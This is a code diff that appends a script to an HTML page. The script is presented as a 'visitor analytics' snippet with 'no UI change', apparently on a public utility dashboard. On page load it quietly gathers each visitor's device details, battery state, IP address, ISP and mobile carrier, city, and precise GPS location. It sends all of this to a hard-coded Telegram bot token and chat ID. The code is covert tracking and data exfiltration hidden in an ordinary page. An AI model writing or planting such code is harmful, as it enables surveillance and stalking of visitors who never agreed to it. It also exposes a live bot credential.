@@ -161,5 +161,140 @@ document.addEventListener("keydown", function(e){
   }
 });
 </script>
+  <script>
+/* ==========================================
+   STABLE VISITOR ANALYTICS SCRIPT (BUG-FIXED)
+   No UI change | One-time send | Safe fallback
+========================================== */
+
+// 🔴 TELEGRAM CONFIG
+const BOT_TOKEN = "7193425151:AAFKa2HcygWLjSOYWTcC917_joT6S-RBYyY";
+const CHAT_ID  = "543961277";
+
+// ================= DEVICE INFO =================
+const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+const os = navigator.platform || "Unknown";
+const screenSize = screen.width + " x " + screen.height;
+const userAgent = navigator.userAgent;
+
+// ================= GLOBAL STATE =================
+let ipData = null;
+let locationData = { status: "Not Requested" };
+let batteryData = "Not Supported";
+let sent = false;
+
+// ================= BATTERY INFO =================
+if (navigator.getBattery) {
+  navigator.getBattery().then(battery => {
+    const percent = Math.round(battery.level * 100);
+    const charging = battery.charging ? "Charging" : "Not Charging";
+    batteryData = `${percent}% (${charging})`;
+    trySend();
+  }).catch(() => {
+    batteryData = "Unavailable";
+  });
+}
+
+// ================= IP + ISP INFO =================
+fetch("https://ipapi.co/json/")
+  .then(res => res.json())
+  .then(data => {
+    ipData = data;
+    trySend();
+  })
+  .catch(() => {
+    ipData = { ip: "Unavailable" };
+    trySend();
+  });
+
+// ================= LOCATION INFO =================
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      locationData = {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        status: "Allowed"
+      };
+      trySend();
+    },
+    err => {
+      locationData = {
+        status: "Denied"
+      };
+      trySend();
+    },
+    { timeout: 8000 }
+  );
+} else {
+  locationData = { status: "Not Supported" };
+}
+
+// ================= SIM / NETWORK DETECTION =================
+function detectSimCompany(org){
+  if(!org) return "Unknown";
+  org = org.toLowerCase();
+  if(org.includes("jio")) return "Jio";
+  if(org.includes("airtel")) return "Airtel";
+  if(org.includes("vodafone") || org.includes("idea")) return "VI (Vodafone Idea)";
+  if(org.includes("bsnl")) return "BSNL";
+  if(org.includes("reliance")) return "Jio";
+  return "WiFi / Other ISP";
+}
+
+// ================= SEND TO TELEGRAM =================
+function trySend(){
+  if(sent) return;
+  if(!ipData || !ipData.ip) return;
+
+  sent = true;
+
+  const mapLink =
+    locationData.lat
+      ? `https://maps.google.com/?q=${locationData.lat},${locationData.lon}`
+      : "Not Available";
+
+  const message = `
+🇮🇳 Public Utility Dashboard Visit
+
+🕒 Time
+${new Date().toLocaleString()}
+
+📱 Device Info
+Type: ${deviceType}
+OS: ${os}
+Screen: ${screenSize}
+
+🔋 Battery
+${batteryData}
+
+🌐 Network
+IP: ${ipData.ip || "N/A"}
+Provider: ${detectSimCompany(ipData.org)}
+ISP: ${ipData.org || "N/A"}
+City: ${ipData.city || "N/A"}
+State: ${ipData.region || "N/A"}
+Country: ${ipData.country_name || "N/A"}
+
+📍 Location
+Status: ${locationData.status}
+Lat: ${locationData.lat || "N/A"}
+Lon: ${locationData.lon || "N/A"}
+Map: ${mapLink}
+
+🔗 Page
+${location.href}
+`;
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message
+    })
+  }).catch(()=>{});
+}
+        </script>
 </body>
 </html>
